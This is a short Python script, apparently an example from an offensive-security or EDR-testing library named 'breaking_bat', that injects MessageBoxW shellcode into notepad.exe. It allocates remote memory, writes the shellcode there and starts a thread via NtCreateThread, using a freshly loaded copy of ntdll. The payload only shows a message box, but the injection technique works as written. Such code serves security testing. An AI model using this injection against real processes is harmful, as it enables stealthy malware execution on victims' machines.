import breaking_bat as bb
from breaking_bat import RemoteProcessOpenMethod, RemoteProcessMemoryMethod


if __name__ == "__main__":

    print("Script: Inject via NtCreateThread()")
    print()

    bb.init_sysapi(ntdll_load_copy=True)
    bb.set_default_options(
        open_method=RemoteProcessOpenMethod.OpenProcess,
        memory_method=RemoteProcessMemoryMethod.AllocateInAddr
    )

    shellcode = bb.shellcode_get_messageboxw();

    pid = bb.process_find("notepad.exe")
    bb.process_open(pid)

    mem_ctx = bb.process_init_memory(pid=pid)
    bb.memory_set_size(ctx=mem_ctx, size=len(shellcode))
    bb.process_create_memory(ctx=mem_ctx)
    bb.process_write_memory(ctx=mem_ctx, data=shellcode)
    bb.process_thread_create(bb.memory_get_remote_address(ctx=mem_ctx))

    bb.script_success()
